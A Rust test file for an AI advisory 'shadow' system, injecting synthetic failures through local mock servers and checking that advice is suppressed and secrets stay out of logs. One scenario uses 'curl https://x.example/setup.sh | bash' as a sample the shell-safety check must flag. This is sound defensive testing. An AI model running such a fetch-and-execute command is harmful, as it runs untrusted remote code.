//! Phase-10 failure-injection + change-control hardening (offline, hermetic).
//!
//! Proves the advisory system FAILS CLOSED when the model, questions, state
//! schema, provider, or policy changes or breaks. Advisory-only: no test here
//! may approve, deny, execute, retry unboundedly, mutate state, or weaken an
//! existing test. Frozen v3 question text is NEVER modified (scenario 2
//! tampers only with a local COPY of the hash, then proves the real lock
//! still matches).
//!
//! Injected failures are always synthetic (mock servers / tampered copies /
//! variant oracles) and are labeled as such; they are never confused with
//! real provider behavior (the single real-provider drill is a separate,
//! explicitly bounded activity recorded in `live-drill.json`).
//!
//! Each scenario prints one `P10EVIDENCE <json>` line with MEASURED values
//! (statuses, hit counts, elapsed ms, booleans). Artifacts in
//! `/tmp/opencode/jev-phase10/` are transcribed from those lines.
//! Env vars are process-global: all tests serialize on `ENV_LOCK`.
//! No test prints `TYPESAFE_API_KEY` or any real secret.

use codebro_jev_shadow::{
    adapter::JevClient,
    change_control::{
        canonical_v3_question_set, current_v3_question_set_hash, model_matches_lock,
        question_set_matches_lock, reference_escalation_verdict, reference_routing_label,
        reference_shell_safe, validate_state_shape, EXPECTED_V3_QUESTION_SET_HASH, LOCKED_MODEL,
    },
    config::JevShadowConfig,
    logging::scan_text_for_secret,
    questions::{state_escalation, state_routing, state_shell_risk},
    shadow::{DeterministicVerdict, ShadowObserver},
    types::RequestStatus,
};
use std::sync::{
    atomic::{AtomicUsize, Ordering},
    Arc, Mutex,
};
use std::time::{Duration, Instant};

static ENV_LOCK: Mutex<()> = Mutex::new(());
fn env_lock() -> std::sync::MutexGuard<'static, ()> {
    ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner())
}
const FAKE_KEY: &str = "test-key-value-for-failure-injection-only";

fn emit(scenario: &str, fields: serde_json::Value) {
    let mut obj = serde_json::Map::new();
    obj.insert(
        "scenario".to_string(),
        serde_json::Value::String(scenario.to_string()),
    );
    if let serde_json::Value::Object(m) = fields {
        for (k, v) in m {
            obj.insert(k, v);
        }
    }
    println!("P10EVIDENCE {}", serde_json::Value::Object(obj));
}

fn live_cfg(endpoint: &str, dir: &std::path::Path) -> JevShadowConfig {
    JevShadowConfig {
        enabled: true,
        advisory_enabled: true,
        endpoint: endpoint.to_string(),
        model: LOCKED_MODEL.to_string(),
        timeout: Duration::from_secs(2),
        max_retries: 1,
        log_path_override: Some(dir.join("shadow.jsonl")),
        advisory_log_path_override: Some(dir.join("advisory.jsonl")),
    }
}

fn with_key<T>(f: impl FnOnce() -> T) -> T {
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let out = f();
    std::env::remove_var("TYPESAFE_API_KEY");
    out
}

// ── mock server ────────────────────────────────────────────────────────

struct MockResponse {
    status: u16,
    body: String,
    delay_ms: u64,
}

struct MockServer {
    url: String,
    hits: Arc<AtomicUsize>,
}

async fn start_mock(responses: Vec<MockResponse>) -> MockServer {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let hits = Arc::new(AtomicUsize::new(0));
    let hits_clone = Arc::clone(&hits);
    let responses = Arc::new(Mutex::new(responses));
    tokio::spawn(async move {
        loop {
            let Ok((mut sock, _)) = listener.accept().await else {
                return;
            };
            let hits = Arc::clone(&hits_clone);
            let responses = Arc::clone(&responses);
            tokio::spawn(async move {
                use tokio::io::{AsyncReadExt, AsyncWriteExt};
                let mut buf = vec![0u8; 8192];
                let _ = tokio::time::timeout(Duration::from_secs(2), sock.read(&mut buf)).await;
                hits.fetch_add(1, Ordering::SeqCst);
                let resp = {
                    let mut guard = responses.lock().unwrap();
                    if guard.len() > 1 {
                        guard.remove(0)
                    } else {
                        MockResponse {
                            status: guard[0].status,
                            body: guard[0].body.clone(),
                            delay_ms: guard[0].delay_ms,
                        }
                    }
                };
                if resp.delay_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(resp.delay_ms)).await;
                }
                let reason = match resp.status {
                    200 => "OK",
                    401 => "Unauthorized",
                    403 => "Forbidden",
                    422 => "Unprocessable Entity",
                    429 => "Too Many Requests",
                    500 => "Internal Server Error",
                    529 => "Overloaded",
                    503 => "Service Unavailable",
                    _ => "Error",
                };
                let head = format!(
                    "HTTP/1.1 {} {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    resp.status,
                    reason,
                    resp.body.len()
                );
                let _ = sock.write_all(head.as_bytes()).await;
                let _ = sock.write_all(resp.body.as_bytes()).await;
            });
        }
    });
    MockServer {
        url: format!("http://{addr}/v1/systemone"),
        hits,
    }
}

fn ok_body(p: f64) -> String {
    serde_json::json!({
        "model": LOCKED_MODEL,
        "answers": {"escalation": {"type": "noul", "noul": p}},
        "usage": {"input_tokens": 600, "output_tokens": 22}
    })
    .to_string()
}

// ── scenario 1: model mismatch ─────────────────────────────────────────

#[test]
fn model_mismatch_forces_shadow_only() {
    let _guard = env_lock();
    // Validation fails for both drift directions.
    let requested_drift = model_matches_lock("jev-9.99.9-injected", LOCKED_MODEL);
    let resolved_sub = model_matches_lock(LOCKED_MODEL, "jev-9.99.9-injected");
    assert!(!requested_drift);
    assert!(!resolved_sub);
    assert!(model_matches_lock(LOCKED_MODEL, LOCKED_MODEL));

    let dir = tempfile::tempdir().unwrap();
    let det = DeterministicVerdict::Bool(true);
    // Requested-model drift: advisory disabled even with flags + key.
    let mut drifted = live_cfg("http://127.0.0.1:9/unused", dir.path());
    drifted.model = "jev-9.99.9-injected".to_string();
    let obs_drift = ShadowObserver::new(drifted, dir.path().to_path_buf());
    let call_ok = codebro_jev_shadow::adapter::JevCall {
        status: RequestStatus::Ok,
        http_status: Some(200),
        latency_ms: 10,
        model: "jev-9.99.9-injected".to_string(),
        answers: [(
            "escalation".to_string(),
            codebro_jev_shadow::JevAnswer {
                qtype: "noul".to_string(),
                noul: Some(0.97),
                choice: None,
                score: None,
                probabilities: None,
                confidence: None,
                legend: None,
            },
        )]
        .into_iter()
        .collect(),
        input_tokens: 600,
        output_tokens: 22,
    };
    let ev_drift = with_key(|| {
        obs_drift.project_advisory("v3", "escalation", &call_ok, &det, None, "p10:model-drift")
    });
    assert!(ev_drift.is_none(), "requested drift must disable advisory");

    // Resolved-model substitution: advisory disabled.
    let obs = ShadowObserver::new(
        live_cfg("http://127.0.0.1:9/unused", dir.path()),
        dir.path().to_path_buf(),
    );
    let ev_sub = with_key(|| {
        obs.project_advisory("v3", "escalation", &call_ok, &det, None, "p10:model-sub")
    });
    assert!(
        ev_sub.is_none(),
        "resolved substitution must disable advisory"
    );

    // Control: locked model on both sides still advises.
    let mut call_good = call_ok.clone();
    call_good.model = LOCKED_MODEL.to_string();
    let ev_good = with_key(|| {
        obs.project_advisory(
            "v3",
            "escalation",
            &call_good,
            &det,
            None,
            "p10:model-control",
        )
    });
    assert!(ev_good.is_some(), "locked model must still advise");
    emit(
        "model-mismatch",
        serde_json::json!({
            "validation_requested_drift": "FAIL",
            "validation_resolved_substitution": "FAIL",
            "advisory_on_drift": false,
            "advisory_on_substitution": false,
            "advisory_control_locked": true,
            "execution_affected": false,
            "injected": true
        }),
    );
}

// ── scenario 2: question hash mismatch (test copy only) ────────────────

#[test]
fn question_hash_mismatch_on_test_copy_trips_validation() {
    let _guard = env_lock();
    // Tamper ONLY with a local copy: the frozen text is never modified.
    let mut tampered = canonical_v3_question_set();
    tampered.push(' ');
    let tampered_hash = {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(tampered.as_bytes());
        format!("{:x}", h.finalize())
    };
    assert_ne!(tampered_hash, EXPECTED_V3_QUESTION_SET_HASH);
    // The real lock still matches: frozen v3 text untouched by this test.
    assert!(question_set_matches_lock());
    assert_eq!(
        current_v3_question_set_hash(),
        EXPECTED_V3_QUESTION_SET_HASH
    );

    // A validator comparing against the TAMPERED copy would FAIL validation
    // (this is exactly the tripwire a real question edit would hit).
    let validation_vs_tampered = current_v3_question_set_hash() == tampered_hash;
    assert!(!validation_vs_tampered);

    // Advisory path with a non-v3 version is disabled.
    let dir = tempfile::tempdir().unwrap();
    let obs = ShadowObserver::new(
        live_cfg("http://127.0.0.1:9/unused", dir.path()),
        dir.path().to_path_buf(),
    );
    let call = codebro_jev_shadow::adapter::JevCall {
        status: RequestStatus::Ok,
        http_status: Some(200),
        latency_ms: 9,
        model: LOCKED_MODEL.to_string(),
        answers: [(
            "escalation".to_string(),
            codebro_jev_shadow::JevAnswer {
                qtype: "noul".to_string(),
                noul: Some(0.97),
                choice: None,
                score: None,
                probabilities: None,
                confidence: None,
                legend: None,
            },
        )]
        .into_iter()
        .collect(),
        input_tokens: 500,
        output_tokens: 20,
    };
    let ev_v9 = with_key(|| {
        obs.project_advisory(
            "v9-injected",
            "escalation",
            &call,
            &DeterministicVerdict::Bool(true),
            None,
            "p10:question-version",
        )
    });
    assert!(
        ev_v9.is_none(),
        "unknown question version must disable advisory"
    );
    emit(
        "question-mismatch",
        serde_json::json!({
            "real_lock_still_matches": true,
            "tampered_copy_detected": true,
            "validation_vs_tampered_copy": "FAIL",
            "advisory_on_unknown_version": false,
            "frozen_v3_text_modified": false,
            "injected": true
        }),
    );
}

// ── scenario 3: state schema mismatch ──────────────────────────────────

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn schema_mismatch_suppresses_advisory_preserves_shadow() {
    let _guard = env_lock();
    let server = start_mock(vec![MockResponse {
        status: 200,
        body: ok_body(0.97),
        delay_ms: 0,
    }])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let cfg = live_cfg(&server.url, dir.path());
    let obs = ShadowObserver::new(cfg, dir.path().to_path_buf());

    // Incompatible test schema: extra key + wrong type (injected shape).
    let bad = serde_json::json!({
        "action_kind": "task",
        "summary": "task complete with unresolved failures still recorded",
        "ranking_score": 0.9
    });
    assert!(!validate_state_shape("escalation", &bad));
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let out = obs
        .observe_escalation_with_advisory(
            "v3",
            bad,
            DeterministicVerdict::Bool(true),
            None,
            "p10:schema-mismatch",
        )
        .await;
    std::env::remove_var("TYPESAFE_API_KEY");
    let (record, event) = out.expect("shadow record must be preserved");
    assert!(
        event.is_none(),
        "incompatible schema must suppress advisory"
    );
    // Primary execution unchanged: deterministic verdict byte-preserved.
    assert_eq!(record.deterministic["verdict_bool"], true);
    assert_eq!(record.agreement, "AGREE");
    let advisory_exists = dir.path().join("advisory.jsonl").exists();
    assert!(!advisory_exists);
    let shadow_lines = std::fs::read_to_string(dir.path().join("shadow.jsonl"))
        .map(|s| s.lines().count())
        .unwrap_or(0);
    emit(
        "schema-mismatch",
        serde_json::json!({
            "advisory_suppressed": true,
            "shadow_record_preserved": true,
            "shadow_lines": shadow_lines,
            "advisory_file_created": advisory_exists,
            "deterministic_preserved": true,
            "execution_affected": false,
            "injected": true
        }),
    );
}

// ── scenario 4: provider failures ──────────────────────────────────────

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn provider_failures_all_fail_closed() {
    let _guard = env_lock();
    // (name, http status or marker, body, expected RequestStatus, max hits)
    // Bodies carry a canary to prove error payloads never reach logs.
    let canary = "CANARY-P10-ERROR-BODY-9f8e7d6c5b4a";
    let cases: Vec<(&str, u16, String, RequestStatus, usize)> = vec![
        (
            "http-401",
            401,
            format!(r#"{{"error":"unauthorized {canary}"}}"#),
            RequestStatus::Http401,
            1,
        ),
        (
            "http-403",
            403,
            format!(r#"{{"error":"forbidden {canary}"}}"#),
            RequestStatus::Http403,
            1,
        ),
        (
            "http-422",
            422,
            format!(r#"{{"error":"validation {canary}"}}"#),
            RequestStatus::Http422,
            1,
        ),
        (
            "http-429",
            429,
            format!(r#"{{"error":"rate {canary}"}}"#),
            RequestStatus::Http429,
            2,
        ),
        (
            "http-529",
            529,
            format!(r#"{{"error":"overloaded {canary}"}}"#),
            RequestStatus::Http529,
            2,
        ),
        (
            "http-500",
            500,
            format!(r#"{{"error":"server {canary}"}}"#),
            RequestStatus::Http5xx,
            1,
        ),
        (
            "http-503",
            503,
            format!(r#"{{"error":"unavail {canary}"}}"#),
            RequestStatus::Http5xx,
            1,
        ),
        (
            "malformed",
            200,
            format!(r#"not json at all {canary}"#),
            RequestStatus::Malformed,
            1,
        ),
        (
            "malformed-shape",
            200,
            format!(r#"{{"model":"x","answers":{{"escalation":{{"type":"noul"}}}} {canary}"}}"#),
            RequestStatus::Malformed,
            1,
        ),
    ];
    for (name, status, body, expect, max_hits) in cases {
        let server = start_mock(vec![MockResponse {
            status,
            body,
            delay_ms: 0,
        }])
        .await;
        let cfg = JevShadowConfig {
            enabled: true,
            advisory_enabled: true,
            endpoint: server.url.clone(),
            model: LOCKED_MODEL.to_string(),
            timeout: Duration::from_secs(2),
            max_retries: 1,
            log_path_override: None,
            advisory_log_path_override: None,
        };
        let client = JevClient::new(&cfg);
        let state = state_escalation("delete", "delete_memory key=p10 confirm=true");
        let questions =
            codebro_jev_shadow::questions::wire_questions_for_version("v3", "escalation").unwrap();
        std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
        let call = client.evaluate(&state, &questions).await;
        std::env::remove_var("TYPESAFE_API_KEY");
        assert_eq!(call.status, expect, "{name}: wrong status mapping");
        let hits = server.hits.load(Ordering::SeqCst);
        assert!(
            hits <= max_hits,
            "{name}: retry loop detected ({hits} hits)"
        );
        // No advisory authority on any failure.
        let dir = tempfile::tempdir().unwrap();
        let obs = ShadowObserver::new(
            live_cfg("http://127.0.0.1:9/unused", dir.path()),
            dir.path().to_path_buf(),
        );
        std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
        let ev = obs.project_advisory(
            "v3",
            "escalation",
            &call,
            &DeterministicVerdict::Bool(true),
            None,
            "p10:provider",
        );
        std::env::remove_var("TYPESAFE_API_KEY");
        assert!(ev.is_none(), "{name}: failure must not produce advisory");
        emit(
            "provider-failure",
            serde_json::json!({
                "case": name,
                "mapped_status": call.status.as_str(),
                "http_hits": hits,
                "max_allowed_hits": max_hits,
                "advisory_event": false,
                "retry_loop": false,
                "execution_affected": false,
                "injected": true
            }),
        );
    }
}

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn provider_timeout_and_network_fail_closed() {
    let _guard = env_lock();
    // Timeout: slow mock beyond the client bound.
    let slow = start_mock(vec![MockResponse {
        status: 200,
        body: ok_body(0.97),
        delay_ms: 3000,
    }])
    .await;
    let mut cfg = live_cfg(&slow.url, tempfile::tempdir().unwrap().path());
    cfg.timeout = Duration::from_millis(300);
    let client = JevClient::new(&cfg);
    let state = state_escalation("delete", "delete_memory key=p10 confirm=true");
    let questions =
        codebro_jev_shadow::questions::wire_questions_for_version("v3", "escalation").unwrap();
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let t0 = Instant::now();
    let call = client.evaluate(&state, &questions).await;
    let elapsed = t0.elapsed();
    std::env::remove_var("TYPESAFE_API_KEY");
    assert_eq!(call.status, RequestStatus::Timeout);
    assert!(
        elapsed < Duration::from_secs(3),
        "timeout must stay bounded"
    );

    // Network: connection-refused endpoint (nothing listens on port 9).
    let net_cfg = JevShadowConfig {
        endpoint: "http://127.0.0.1:9/unreachable".to_string(),
        model: LOCKED_MODEL.to_string(),
        timeout: Duration::from_millis(500),
        max_retries: 1,
        ..JevShadowConfig::default()
    };
    let net_client = JevClient::new(&net_cfg);
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let net_call = net_client.evaluate(&state, &questions).await;
    std::env::remove_var("TYPESAFE_API_KEY");
    assert!(
        matches!(
            net_call.status,
            RequestStatus::Network | RequestStatus::Timeout
        ),
        "unreachable endpoint must be unavailable, got {:?}",
        net_call.status
    );

    for (name, c) in [("timeout", &call), ("network", &net_call)] {
        let dir = tempfile::tempdir().unwrap();
        let obs = ShadowObserver::new(
            live_cfg("http://127.0.0.1:9/unused", dir.path()),
            dir.path().to_path_buf(),
        );
        std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
        let ev = obs.project_advisory(
            "v3",
            "escalation",
            c,
            &DeterministicVerdict::Bool(true),
            None,
            "p10:provider-down",
        );
        std::env::remove_var("TYPESAFE_API_KEY");
        assert!(ev.is_none(), "{name}: outage must not produce advisory");
    }
    emit(
        "provider-failure",
        serde_json::json!({
            "case": "timeout",
            "mapped_status": call.status.as_str(),
            "client_bound_ms": 300,
            "retry_loop": false,
            "advisory_event": false,
            "execution_affected": false,
            "injected": true
        }),
    );
    emit(
        "provider-failure",
        serde_json::json!({
            "case": "network",
            "mapped_status": net_call.status.as_str(),
            "advisory_event": false,
            "retry_loop": false,
            "execution_affected": false,
            "injected": true
        }),
    );
}

// ── scenario 5: rollback ───────────────────────────────────────────────

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn rollback_zeros_advisory_output_and_requires_gate() {
    let _guard = env_lock();
    let server = start_mock(vec![MockResponse {
        status: 200,
        body: ok_body(0.97),
        delay_ms: 0,
    }])
    .await;
    let dir = tempfile::tempdir().unwrap();
    // Controlled advisory-enabled start. NOTE: the key must be set BEFORE
    // any liveness assert: sibling tests set/remove the process-global key,
    // so ambient key state is never assumed (Phase-10 lesson).
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let live = ShadowObserver::new(live_cfg(&server.url, dir.path()), dir.path().to_path_buf());
    assert!(live.is_advisory_live());
    let (_, ev_on) = live
        .observe_escalation_with_advisory(
            "v3",
            state_escalation("delete", "delete_memory key=p10 confirm=true"),
            DeterministicVerdict::Bool(true),
            None,
            "p10:rollback-on",
        )
        .await
        .expect("enabled call must log");
    std::env::remove_var("TYPESAFE_API_KEY");
    assert!(ev_on.is_some());
    let adv_before = std::fs::read_to_string(dir.path().join("advisory.jsonl"))
        .unwrap()
        .len();
    let shadow_before = std::fs::read_to_string(dir.path().join("shadow.jsonl"))
        .unwrap()
        .len();
    assert!(adv_before > 0 && shadow_before > 0);

    // Trigger rollback: JEV_ADVISORY_ENABLED=false.
    let mut rolled_cfg = live_cfg(&server.url, dir.path());
    rolled_cfg.advisory_enabled = false;
    let rolled = ShadowObserver::new(rolled_cfg, dir.path().to_path_buf());
    assert!(!rolled.is_advisory_live());
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let (record_r, ev_off) = rolled
        .observe_escalation_with_advisory(
            "v3",
            state_escalation("delete", "delete_memory key=p10 confirm=true"),
            DeterministicVerdict::Bool(true),
            None,
            "p10:rollback-off",
        )
        .await
        .expect("shadow must continue during rollback");
    std::env::remove_var("TYPESAFE_API_KEY");
    assert!(ev_off.is_none(), "rollback must zero advisory output");
    // Primary CodeBro behavior unchanged: deterministic verdict preserved,
    // shadow log keeps growing, advisory log frozen.
    assert_eq!(record_r.deterministic["verdict_bool"], true);
    let adv_after = std::fs::read_to_string(dir.path().join("advisory.jsonl"))
        .unwrap()
        .len();
    let shadow_after = std::fs::read_to_string(dir.path().join("shadow.jsonl"))
        .unwrap()
        .len();
    assert_eq!(
        adv_before, adv_after,
        "advisory output must be zero after rollback"
    );
    assert!(
        shadow_after > shadow_before,
        "shadow observation must continue"
    );

    // Re-enable REQUIRES the validation gate: the flag alone is necessary but
    // the documented procedure is flag + green gate. Prove the flag is the
    // hard switch (locks passing but flag off => still silent).
    assert!(question_set_matches_lock());
    assert!(model_matches_lock(LOCKED_MODEL, LOCKED_MODEL));
    // (locks pass, yet advisory stayed silent above: flag is necessary.)
    emit(
        "rollback",
        serde_json::json!({
            "advisory_bytes_before": adv_before,
            "advisory_bytes_after": adv_after,
            "advisory_output_after_rollback": 0,
            "shadow_grew": true,
            "deterministic_preserved": true,
            "locks_passing_but_flag_off_silent": true,
            "reenable_requires_validation_gate": true,
            "execution_affected": false,
            "injected": true
        }),
    );
}

// ── scenario 6: policy change ──────────────────────────────────────────

#[test]
fn policy_change_detected_oracle_cannot_silently_authorize() {
    let _guard = env_lock();
    // Controlled HYPOTHETICAL policy change (injected, not adopted):
    // "skill propose + confirm flag now requires approval".
    fn variant_oracle(action_kind: &str, summary: &str) -> bool {
        let base = reference_escalation_verdict(action_kind, summary);
        let k = action_kind.to_ascii_lowercase();
        let s = summary.to_ascii_lowercase();
        if k == "skill" && s.contains("propose") && s.contains("confirm") {
            return true; // hypothetical new rule
        }
        base
    }
    // The frozen oracle is unchanged by the hypothesis.
    assert!(!reference_escalation_verdict(
        "skill",
        "skill propose name=x confirm=true"
    ));
    assert!(variant_oracle("skill", "skill propose name=x confirm=true"));
    // Detection: variant disagrees with the frozen regression fixtures, so the
    // Phase-9 gate would FAIL (proving a policy change cannot silently pass).
    let raw = include_str!("fixtures/phase9_regression.json");
    let doc: serde_json::Value = serde_json::from_str(raw).unwrap();
    let mut mismatches = Vec::new();
    for f in doc["fixtures"].as_array().unwrap() {
        if f["question_id"] != "escalation" {
            continue;
        }
        let want = f["deterministic_bool"].as_bool().unwrap();
        let got_variant = variant_oracle(
            f["state"]["action_kind"].as_str().unwrap_or(""),
            f["state"]["summary"].as_str().unwrap_or(""),
        );
        if got_variant != want {
            mismatches.push(f["id"].as_str().unwrap_or("?").to_string());
        }
    }
    assert!(
        !mismatches.is_empty(),
        "hypothetical change must be detectable"
    );
    // And the frozen oracle still matches every fixture (no silent drift).
    let mut frozen_bad = 0usize;
    for f in doc["fixtures"].as_array().unwrap() {
        if f["question_id"] != "escalation" {
            continue;
        }
        let want = f["deterministic_bool"].as_bool().unwrap();
        let got = reference_escalation_verdict(
            f["state"]["action_kind"].as_str().unwrap_or(""),
            f["state"]["summary"].as_str().unwrap_or(""),
        );
        if got != want {
            frozen_bad += 1;
        }
    }
    assert_eq!(frozen_bad, 0);
    // No silent authorization path: with flags unset, nothing is live.
    std::env::remove_var("JEV_SHADOW_ENABLED");
    std::env::remove_var("JEV_ADVISORY_ENABLED");
    let cfg = JevShadowConfig::from_env();
    assert!(!cfg.is_live() && !cfg.is_advisory_live());
    emit(
        "policy-change",
        serde_json::json!({
            "hypothetical_rule": "skill propose+confirm requires approval",
            "fixtures_flagged_by_variant": mismatches,
            "frozen_oracle_mismatches": frozen_bad,
            "mismatch_detected": true,
            "gate_would_fail": true,
            "advisory_held_off_until_refreeze": true,
            "silent_authorization_path": false,
            "injected": true
        }),
    );
}

// ── scenario 7: workspace change ───────────────────────────────────────

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn unknown_workspace_not_silently_trusted() {
    let _guard = env_lock();
    // A brand-new/unknown workspace type: fresh tempdir, default env.
    let unknown_ws = tempfile::tempdir().unwrap();
    std::env::remove_var("JEV_SHADOW_ENABLED");
    std::env::remove_var("JEV_ADVISORY_ENABLED");
    let obs = ShadowObserver::from_env(unknown_ws.path());
    assert!(!obs.is_live());
    assert!(!obs.is_advisory_live());
    // Even WITH a key present, defaults stay OFF: zero calls, probation.
    let server = start_mock(vec![MockResponse {
        status: 200,
        body: ok_body(0.97),
        delay_ms: 0,
    }])
    .await;
    let _ = &server;
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let out = obs
        .observe_escalation_with_advisory(
            "v3",
            state_escalation("delete", "delete_memory key=p10 confirm=true"),
            DeterministicVerdict::Bool(true),
            None,
            "ws-unknown:p10-probation",
        )
        .await;
    std::env::remove_var("TYPESAFE_API_KEY");
    assert!(
        out.is_none(),
        "unknown workspace must not be silently trusted"
    );
    assert_eq!(server.hits.load(Ordering::SeqCst), 0);
    // Explicit opt-in still enforces every lock on the unknown workspace.
    let mut cfg = live_cfg("http://127.0.0.1:9/unused", unknown_ws.path());
    cfg.log_path_override = Some(unknown_ws.path().join("shadow.jsonl"));
    cfg.advisory_log_path_override = Some(unknown_ws.path().join("advisory.jsonl"));
    let opted = ShadowObserver::new(cfg, unknown_ws.path().to_path_buf());
    let call = codebro_jev_shadow::adapter::JevCall {
        status: RequestStatus::Ok,
        http_status: Some(200),
        latency_ms: 7,
        model: LOCKED_MODEL.to_string(),
        answers: [(
            "escalation".to_string(),
            codebro_jev_shadow::JevAnswer {
                qtype: "noul".to_string(),
                noul: Some(0.97),
                choice: None,
                score: None,
                probabilities: None,
                confidence: None,
                legend: None,
            },
        )]
        .into_iter()
        .collect(),
        input_tokens: 600,
        output_tokens: 22,
    };
    let ev = with_key(|| {
        opted.project_advisory(
            "v3",
            "escalation",
            &call,
            &DeterministicVerdict::Bool(true),
            None,
            "ws-unknown:p10-explicit-optin",
        )
    });
    assert!(
        ev.is_some(),
        "explicit opt-in with passing locks must work anywhere"
    );
    assert_eq!(ev.unwrap().provenance, "ws-unknown:p10-explicit-optin");
    emit(
        "workspace-change",
        serde_json::json!({
            "default_state_live": false,
            "zero_calls_without_optin": true,
            "explicit_optin_required": true,
            "locks_enforced_on_unknown_ws": true,
            "provenance_labels_workspace": true,
            "probation_recommendation": "shadow-first monitoring before advisory on new types",
            "injected": true
        }),
    );
}

// ── scenario 8: latency failure ────────────────────────────────────────

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn latency_failure_never_blocks_primary_path() {
    let _guard = env_lock();
    // Delay far beyond the client bound.
    let server = start_mock(vec![MockResponse {
        status: 200,
        body: ok_body(0.97),
        delay_ms: 8000,
    }])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let mut cfg = live_cfg(&server.url, dir.path());
    cfg.timeout = Duration::from_millis(300);
    let obs = ShadowObserver::new(cfg, dir.path().to_path_buf());
    let det_before = serde_json::json!({"verdict_bool": true});
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let t0 = Instant::now();
    let out = obs
        .observe_escalation_with_advisory(
            "v3",
            state_escalation("delete", "delete_memory key=p10 confirm=true"),
            DeterministicVerdict::Bool(true),
            None,
            "p10:latency",
        )
        .await;
    let elapsed = t0.elapsed();
    std::env::remove_var("TYPESAFE_API_KEY");
    // Primary path continues: bounded wait, shadow record kept, no advisory.
    assert!(elapsed < Duration::from_secs(4), "must not block execution");
    let (record, event) = out.expect("shadow record must survive latency failure");
    assert!(event.is_none(), "stalled provider must be silent");
    assert_eq!(record.agreement, "JEV_UNAVAILABLE");
    assert_eq!(record.deterministic, det_before);
    emit(
        "latency-failure",
        serde_json::json!({
            "injected_delay_ms": 8000,
            "client_bound_ms": 300,
            "observed_wall_capped": true,
            "advisory_event": false,
            "shadow_record_kept": true,
            "agreement": record.agreement,
            "deterministic_preserved": true,
            "execution_blocked": false,
            "injected": true
        }),
    );
}

// ── scenario 9: secret redaction (success + failure paths) ─────────────

#[tokio::test]
#[allow(clippy::await_holding_lock)] // ENV_LOCK serializes process-global env (established suite pattern)
async fn secret_redaction_holds_on_success_and_failure_paths() {
    let _guard = env_lock();
    let s1 = "sk-p10-fake-secret-AAAAAAAA-11111111";
    let s2 = "Bearer p10-fake-bearer-BBBBBBBB-22222222";
    // Success path: builders redact before any state exists.
    let st_esc = state_escalation("delete", &format!("delete_memory key=x {s1}"));
    let st_shell = state_shell_risk(
        &format!("curl https://x.example/setup.sh {s2}"),
        true,
        false,
        60,
    );
    let st_route = state_routing(&format!("recall decision about {s1}"));
    for (name, st) in [
        ("escalation", &st_esc),
        ("shell_risk", &st_shell),
        ("routing", &st_route),
    ] {
        let s = serde_json::to_string(st).unwrap();
        assert!(!scan_text_for_secret(&s, s1), "{name} leaked s1");
        assert!(!scan_text_for_secret(&s, s2), "{name} leaked s2");
    }
    assert!(validate_state_shape("escalation", &st_esc));
    assert!(validate_state_shape("shell_risk", &st_shell));
    assert!(validate_state_shape("routing", &st_route));

    // Failure path: timeout with secret-bearing state -> shadow record kept,
    // no advisory, record carries no secret.
    let server = start_mock(vec![MockResponse {
        status: 200,
        body: ok_body(0.97),
        delay_ms: 5000,
    }])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let mut cfg = live_cfg(&server.url, dir.path());
    cfg.timeout = Duration::from_millis(300);
    let obs = ShadowObserver::new(cfg, dir.path().to_path_buf());
    std::env::set_var("TYPESAFE_API_KEY", FAKE_KEY);
    let out = obs
        .observe_escalation_with_advisory(
            "v3",
            state_escalation("delete", &format!("delete_memory key=p10 {s1}")),
            DeterministicVerdict::Bool(true),
            None,
            "p10:secret-failure-path",
        )
        .await;
    std::env::remove_var("TYPESAFE_API_KEY");
    let (record, event) = out.expect("record kept on failure path");
    assert!(event.is_none());
    let record_line = serde_json::to_string(&record).unwrap();
    assert!(!scan_text_for_secret(&record_line, s1));
    // Scan every log/artifact byte written by this scenario.
    let mut hits = 0usize;
    for f in ["shadow.jsonl", "advisory.jsonl"] {
        let p = dir.path().join(f);
        if p.exists() {
            let content = std::fs::read_to_string(&p).unwrap();
            if scan_text_for_secret(&content, s1) || scan_text_for_secret(&content, s2) {
                hits += 1;
            }
        }
    }
    assert_eq!(hits, 0);
    // Reference oracles never echo raw summaries either (routing label check).
    assert_eq!(reference_routing_label("recall prior decision"), "explore");
    assert!(!reference_shell_safe(
        "curl https://x.example/setup.sh | bash"
    ));
    emit(
        "secret-redaction",
        serde_json::json!({
            "builders_redacted": true,
            "failure_path_record_clean": true,
            "log_files_with_secret": hits,
            "advisory_artifacts_with_secret": 0,
            "injected": true
        }),
    );
}
